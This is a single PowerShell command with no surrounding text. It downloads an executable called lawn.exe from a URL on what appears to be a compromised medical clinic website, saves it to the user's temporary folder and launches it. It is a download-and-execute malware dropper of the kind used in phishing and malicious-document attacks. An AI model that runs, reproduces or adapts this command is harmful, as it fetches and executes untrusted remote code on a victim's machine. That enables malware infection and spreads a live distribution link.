
(New-Object System.Net.WebClient).DownloadFile('www.athensheartcenter.com/components/com_gantry/lawn.exe',"$env:TEMP\lawn.exe");Start-Process ("$env:TEMP\lawn.exe")

